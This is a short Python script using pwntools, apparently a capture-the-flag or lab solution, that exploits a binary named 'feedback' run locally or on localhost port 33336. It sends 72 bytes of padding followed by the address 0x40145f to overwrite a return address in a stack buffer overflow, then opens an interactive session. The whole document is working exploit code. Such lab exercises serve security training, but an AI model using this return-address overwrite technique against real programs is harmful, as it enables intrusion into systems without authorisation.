#!/bin/python3

from pwn import *

binary = '../gen/feedback'
elf = ELF(binary)

if args.LOCAL: 
    p = process(binary)

elif args.REMOTE:
    p = remote('localhost', 33336)

offset = 72
padding = b'a' * offset
flag=p64(0x40145f)

payload = padding + flag

log.info("Enviando exploit...")

p.sendline(payload)

p.interactive()

